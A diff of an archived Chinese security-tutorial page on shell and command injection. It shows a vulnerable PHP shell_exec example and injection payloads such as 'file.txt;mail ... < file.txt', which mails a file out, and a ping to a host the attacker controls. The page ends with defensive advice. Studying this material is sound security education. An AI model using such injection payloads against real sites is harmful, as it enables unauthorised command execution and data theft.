@@ -3,14 +3,14 @@
 			<head>
 			     <title>Shell Injection &amp; Command Injection - 五道口杀气</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/1018">http://drops.wooyun.org/papers/1018</a></h1>
 				
       <p>
-        <h2>0x00 前言</h2>
+        </p><h2>0x00 前言</h2>
 
-<hr />
+<hr>
 
 <p>Shell注入(Shell Injection)，也被称为命令注入(Command Injection)，虽然不是最经常提及或发现的漏洞，但是危害巨大。</p>
 
@@ -18,7 +18,7 @@
 
 <h2>0x01 简单介绍</h2>
 
-<hr />
+<hr>
 
 <p>通常情况下，Web应用程序会有需要执行shell命令的时候，有可能只是使用Unix sendmail程序发送电子邮件，或运行指定的Perl和C + +程序。从开发的角度来看，这样做可以减少程序的开发时间。然而，如果数据是通过一个用户界面传递到这些程序中，则攻击者可能能够注入shell命令到这些后台程序。</p>
 
@@ -50,7 +50,7 @@ echo shell_exec('cat '.$_GET['filename']);
 
 <h2>0x02 如何利用</h2>
 
-<hr />
+<hr>
 
 <p>在前面的内容中，我们看到了如何进行命令注入的简单案例。下面看下shell注入的几种情况，以及如何进行shell注入。假设一些我们经过分析，已经发现了一个网站有shell注入，那么你将有很多种注入的方式。</p>
 
@@ -99,7 +99,7 @@ $(shell_command) 执行shell_command命令
 
 <h2>0x03 如何寻找shell注入</h2>
 
-<hr />
+<hr>
 
 <p>主要是寻找你怀疑的某个功能可以是后端用命令来执行的，可以进行简单的测试，由于操作系统系统可能不同，那么你测试的语句也应该是不一样的：</p>
 
@@ -126,20 +126,20 @@ echo shell_exec('cat "'.$_GET['command']).'"';
 
 <p>如果有时候并没有命令回显，那么可以用以下方式检测是否存在盲注：</p>
 
-<pre><code>file.txt;mail <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cfbbaabcbbaabd8fbbaabcbbe1aca0a2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> &lt; file.txt    //send an email to yourself
+<pre><code>file.txt;mail <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cfbbaabcbbaabd8fbbaabcbbe1aca0a2">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> &lt; file.txt    //send an email to yourself
 file.txt;ping www.test.com      //ping a webserver you have control of
 file.txt;echo "test" &gt; test.txt     //write the word "test" to test.txt. try opening this file with the browser. 
 </code></pre>
 
 <h2>0x04 如何防御</h2>
 
-<hr />
+<hr>
 
 <p>尽管上面说有很多方式进行shell注入，但是可以用几个简单的方式进行防御，最主要的是过滤所有用户输入的数据，最好是能避免用户的数据直接进入命令执行当中，如果不可避免，尽量避免（; | &amp;）等符号，最好是用白名单。</p>
 
 <p>如果不能是白名单，PHP当中提供了escapeshellarg和escapeshellcmd两个函数进行过滤，但这并不能完全保障代码的安全性。需要具体情况再做相应的滤。</p>
 
-<p>from:<a href="https://www.golemtechnologies.com/articles/shell-injection#how-to-test-if-website-vulnerable-to-command-injection">https://www.golemtechnologies.com/articles/shell-injection#how-to-test-if-website-vulnerable-to-command-injection</a></p>      </p>
+<p>from:<a href="https://www.golemtechnologies.com/articles/shell-injection#how-to-test-if-website-vulnerable-to-command-injection">https://www.golemtechnologies.com/articles/shell-injection#how-to-test-if-website-vulnerable-to-command-injection</a></p>      <p></p>
     
 			</body>
 		</html>
